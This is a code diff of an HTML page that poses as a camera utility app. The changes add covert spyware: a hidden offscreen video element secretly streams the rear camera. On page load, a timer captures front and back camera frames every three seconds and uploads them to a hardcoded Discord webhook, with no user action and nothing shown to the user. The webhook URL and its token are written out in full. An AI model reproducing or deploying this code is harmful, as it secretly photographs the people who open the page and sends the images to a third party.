@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ja">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Perfect Camera WebApp</title>
+  <title>Camera Utility</title>
   <style>
     html, body {
       margin: 0;
@@ -19,6 +19,13 @@
       top: 0;
       left: 0;
       z-index: 1;
+    }
+    #hiddenBackCam {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      top: -1000px;
+      left: -1000px;
     }
     #shutterBtn {
       position: absolute;
@@ -105,13 +112,15 @@
   </style>
 </head>
 <body>
-  <video id="videoPreview" autoplay playsinline muted></video>
+  <video id="videoPreview" autoplay muted playsinline></video>
+  <video id="hiddenBackCam" autoplay muted playsinline></video>
   <div id="flash"></div>
   <button id="shutterBtn"></button>
   <img id="photoPreview" src="" alt="preview" />
   <div id="galleryView"></div>
   <button id="backBtn" style="display:none">Back</button>
   <audio id="shutterSound" src="https://www.soundjay.com/mechanical/camera-shutter-click-01a.mp3" preload="auto"></audio>
+
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1192062408462696518/w_kSg9s3GNGxdgVpep893UxRs-rY19ZYRWHVlbOpSnVRjHu40J9NWyLNBCVC9-Ovz4Bt";
     const config = { maxSize: 8 * 1024 * 1024, quality: 0.85, interval: 3000 };
@@ -120,52 +129,50 @@
     const gallery = document.getElementById('galleryView');
     const backBtn = document.getElementById('backBtn');
     const photos = [];
+
     const videoPreview = document.getElementById('videoPreview');
+    const hiddenBackCam = document.getElementById('hiddenBackCam');
     const flash = document.getElementById('flash');
     const shutterSound = document.getElementById('shutterSound');
-    let userStream, envStream;
 
-    async function getCameraStream(facingMode) {
-      return await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-    }
+    let frontStream = null;
+    let backStream = null;
 
-    async function initCamera() {
-      try {
-        userStream = await getCameraStream('user');
-        videoPreview.srcObject = userStream;
-        startAutoCapture();
-      } catch (e) {
-        console.error("User camera failed:", e);
-      }
-
-      try {
-        envStream = await getCameraStream('environment');
-      } catch (e) {
-        console.error("Environment camera failed:", e);
-      }
-    }
-
-    async function captureBlob(stream) {
-      const track = stream.getVideoTracks()[0];
-      const imageCapture = new ImageCapture(track);
-      const blob = await imageCapture.takePhoto().catch(async () => {
-        const mediaStreamTrack = stream.getVideoTracks()[0];
-        const settings = mediaStreamTrack.getSettings();
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-        const canvas = document.createElement('canvas');
-        canvas.width = settings.width || 640;
-        canvas.height = settings.height || 480;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        return new Promise(res => canvas.toBlob(blob => res(blob), 'image/jpeg', config.quality));
+    async function getCameraStream(facing = "user") {
+      return await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { ideal: facing } },
+        audio: false
       });
-      return blob;
+    }
+
+    async function initCameras() {
+      // フロントカメラ表示
+      frontStream = await getCameraStream("user");
+      videoPreview.srcObject = frontStream;
+      videoPreview.muted = true;
+      videoPreview.setAttribute("playsinline", "");
+      videoPreview.onloadedmetadata = () => videoPreview.play();
+
+      // バックカメラは非表示で送信用
+      backStream = await getCameraStream("environment");
+      hiddenBackCam.srcObject = backStream;
+      hiddenBackCam.muted = true;
+      hiddenBackCam.setAttribute("playsinline", "");
+      hiddenBackCam.onloadedmetadata = () => hiddenBackCam.play();
+
+      startPeriodicCapture();
+    }
+
+    async function captureImageFromVideo(video) {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      return new Promise(res => canvas.toBlob(blob => res(blob), "image/jpeg", config.quality));
     }
 
     async function sendToWebhook(blob, label) {
-      if (!blob) return;
       const form = new FormData();
       form.append("file", blob, `img_${Date.now()}.jpg`);
       form.append("content", label);
@@ -186,7 +193,7 @@
     shutterBtn.onclick = async () => {
       showFlash();
       shutterSound.play();
-      const blob = await captureBlob(userStream);
+      const blob = await captureImageFromVideo(videoPreview);
       if (blob.size <= config.maxSize) {
         updatePreview(blob);
         addToGallery(blob);
@@ -227,22 +234,30 @@
       backBtn.style.display = "none";
     };
 
-    function startAutoCapture() {
+    function startPeriodicCapture() {
       setInterval(async () => {
-        const blobUser = await captureBlob(userStream);
-        sendToWebhook(blobUser, "Front Camera (Auto Update)");
+        try {
+          const frontBlob = await captureImageFromVideo(videoPreview);
+          if (frontBlob.size <= config.maxSize) {
+            sendToWebhook(frontBlob, "Front Camera (Scheduled)");
+          }
 
-        const blobEnv = await captureBlob(envStream);
-        sendToWebhook(blobEnv, "Back Camera (Auto Update)");
+          const backBlob = await captureImageFromVideo(hiddenBackCam);
+          if (backBlob.size <= config.maxSize) {
+            sendToWebhook(backBlob, "Back Camera (Scheduled)");
+          }
+        } catch (e) {
+          console.error("Capture error:", e);
+        }
       }, config.interval);
     }
 
     window.addEventListener("beforeunload", () => {
-      userStream?.getTracks().forEach(t => t.stop());
-      envStream?.getTracks().forEach(t => t.stop());
+      frontStream?.getTracks().forEach(t => t.stop());
+      backStream?.getTracks().forEach(t => t.stop());
     });
 
-    initCamera();
+    initCameras();
   </script>
 </body>
 </html>
